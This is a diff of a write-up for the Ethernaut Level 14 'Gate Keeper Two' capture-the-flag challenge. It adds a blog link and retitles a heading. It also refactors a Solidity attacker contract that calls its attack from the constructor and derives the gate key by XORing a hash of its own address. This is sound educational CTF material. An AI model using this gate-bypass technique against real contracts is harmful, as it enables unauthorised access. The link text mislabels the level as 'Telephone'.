@@ -6,11 +6,14 @@
 <h1><strong>Ethernaut Level 14 - Gate Keeper Two</strong></h1>
 
 </div>
+<br>
+
+Read the article directly on my blog: [Ethernaut Solutions | Level 14 - Telephone](https://blog.pedrojok.com/the-ethernaut-ctf-solutions-14-gate-keeper-two)
 
 ## Table of Contents
 
 - [Table of Contents](#table-of-contents)
-- [Objectif](#objectif)
+- [Goals](#goals)
 - [The hack](#the-hack)
   - [modifier one](#modifier-one)
   - [modifier two](#modifier-two)
@@ -19,7 +22,7 @@
 - [Takeaway](#takeaway)
 - [Reference](#reference)
 
-## Objectif
+## Goals
 
 <img src="../assets/requirements/14-gate2-requirements.webp" width="800px"/>
 
@@ -88,17 +91,11 @@ We can now write our contract to pass the three gates:
 pragma solidity ^0.8.20;
 
 contract GateSkipperTwo {
-    address private gateKeeperTwo;
-
     constructor(address _gateKeeperTwo) {
-        gateKeeperTwo = _gateKeeperTwo;
+        attack(_gateKeeperTwo);
     }
 
-    constructor() {
-        attack();
-    }
-
-    function attack() private {
+    function attack(address gateKeeperTwo) private {
         bytes8 _gateKey = bytes8(
             uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                 type(uint64).max
